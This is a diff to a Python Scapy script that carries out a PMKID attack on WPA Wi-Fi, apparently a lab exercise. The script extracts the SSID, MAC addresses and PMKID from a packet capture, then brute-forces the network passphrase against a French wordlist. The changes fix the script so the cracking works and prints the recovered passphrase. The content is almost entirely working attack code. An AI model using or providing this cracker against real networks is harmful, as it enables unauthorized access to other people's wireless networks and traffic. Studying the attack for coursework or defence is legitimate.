@@ -34,8 +34,8 @@ def catchAssociationRequest(packets):
     for packet in packets:
         if packet.haslayer(Dot11AssoReq):
             ssid = packet.info.decode('UTF-8')
-            ap_mac = a2b_hex(packet.addr1.replace(':', ''))
-            sta_mac = a2b_hex(packet.addr2.replace(':', ''))
+            ap_mac = packet.addr1.replace(':', '')
+            sta_mac = packet.addr2.replace(':', '')
             return ssid, ap_mac, sta_mac
     return None, None, None
 
@@ -64,28 +64,26 @@ def catch4WayHandshake(ap_mac, sta_mac, packets):
     EAPOL_ACK = 778  # EAPOL-Key4(ACK)
 
     for packet in packets:
-        dst_mac = a2b_hex(packet.addr1.replace(':', ''))
+        dst_mac = packet.addr1.replace(':', '')
 
         if packet.haslayer(WPA_key):
             wpa_key = packet.getlayer(WPA_key)
 
             # EAPOL-Key1(ANonce) / AP -> STA
             if (wpa_key.key_info == EAPOL_ANONCE) \
-                     and (dst_mac == sta_mac):
-                    #pmkid = great
-
-    return pmkid
+            and (dst_mac == sta_mac):
+                return (b2a_hex(wpa_key.wpa_key).decode('UTF-8'))[12:]
+    
+    return None
 
 '''
 Calculate PMKID
 '''
 def tryPmkid(passphrase, ssid, ap_mac, sta_mac):
-    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK and calculate the pmkid
     passphrase = str.encode(passphrase)
-    ssid = str.encode(ssid)
-    pmk = pbkdf2(hashlib.sha1,passphrase, ssid, 4096, 32)
-    pmkid = hmac.new(pmk, str.encode("PMK Name")+ap_mac+sta_mac, hashlib.sha1).digest()[:16]
-
+    pmk = pbkdf2(hashlib.sha1,passphrase, str.encode(ssid), 4096, 32)
+    pmk_data = str.encode("PMK Name") + a2b_hex(ap_mac) + a2b_hex(sta_mac)
+    pmkid = b2a_hex(hmac.new(pmk, pmk_data, hashlib.sha1).digest()[:16]).decode('UTF-8')
     return pmkid
 
 def bruteForcePassphrase(ssid, APmac, Clientmac, pmkid):
@@ -95,26 +93,22 @@ def bruteForcePassphrase(ssid, APmac, Clientmac, pmkid):
     dico = open('liste_francais.txt', 'r')
     for line in dico.readlines():
         for word in line.split():
-            if pmkid == b2a_hex(tryPmkid(word, ssid, APmac, Clientmac)):
+            if pmkid == tryPmkid(word, ssid, APmac, Clientmac):
                 return word
     return None
 
-# Read capture file -- it contains beacon, authentication, associacion, handshake and data
+# Read capture file -- it contains beacon, authentication, association, handshake and data
 wpa=rdpcap("PMKID_handshake.pcap")
-
 ssid, APmac, Clientmac = catchAssociationRequest(wpa)
-pmkid = catch4WayHandshake(APmac,  Clientmac, wpa)
-passphrase = bruteForcePassphrase(ssid,APmac,Clientmac,pmkid)
-
-print ("\nValues used to derivate keys")
-print ("============================")
-print ("SSID:\t\t",ssid)
-print ("AP Mac:\t\t",b2a_hex(APmac))
-print ("Client Mac:\t",b2a_hex(Clientmac))
-#print ("Pmkid:\t",b2a_hex(pmkid))
+pmkid = catch4WayHandshake(APmac, Clientmac, wpa)
+passphrase = bruteForcePassphrase(ssid, APmac, Clientmac, pmkid)
 
 print ("\nBrute force attack")
 print ("============================")
-#print ("Passphrase:\t", passphrase, "\n")
+print ("SSID:\t\t",ssid)
+print ("AP Mac:\t\t",APmac)
+print ("Client Mac:\t",Clientmac)
+print ("PMKID:\t\t",pmkid)
+print ("Passphrase:\t", passphrase, "\n")
 
 
